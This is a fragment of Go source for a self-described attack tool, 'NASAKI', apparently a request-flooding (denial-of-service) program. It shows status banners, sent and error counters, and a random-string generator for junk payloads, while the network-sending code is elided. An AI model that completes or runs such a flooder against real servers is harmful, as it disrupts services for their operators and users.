...
func main() {
	...
	if version {
		fmt.Println("Nasaki", __version__)
		os.Exit(0)
	}
	...
	go func() {
		fmt.Println("-- NASAKI Attack Started 😈--\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tAttack 😈 |\tBad😢")
		for {
			...
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- NASAKI Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()
...
func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(555550)+9999))
	}
	return string(a)
}
